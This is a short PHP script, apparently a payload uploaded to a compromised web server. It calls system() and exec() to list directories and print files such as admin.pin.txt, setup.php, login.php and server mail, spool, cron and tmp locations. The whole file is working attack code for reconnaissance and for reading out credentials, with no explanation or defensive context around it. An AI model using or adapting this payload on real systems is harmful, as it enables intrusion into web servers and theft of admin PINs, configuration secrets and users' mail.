<?php 
echo system('ls');
echo "here is for txt !!!!  \n";
echo system('cat admin.pin.txt');
echo "here is for setup  \n";
echo system('cat setup.php');
echo "last \n";
echo system('ls ..');
echo exec('ls ..');
echo system('ls');
echo system('cat refresh.html');
echo system('cat login.php');
echo file_get_contents('setup.php');
echo system('ls ../..');
echo system('ls ../../mail');
echo system('cat ../../mail');
echo "spool \n";
echo system('ls ../../spool');
echo system('cat ../../spool');
echo system('ls ../../spool/cron');
echo system('cat ../../spool/mail');
echo "tmp \n";
echo system('ls ../../tmp');
echo system('cat ../../tmp');
echo "lock \n";
echo system('ls ../../lock');
echo system('cat ../../lock');
?>
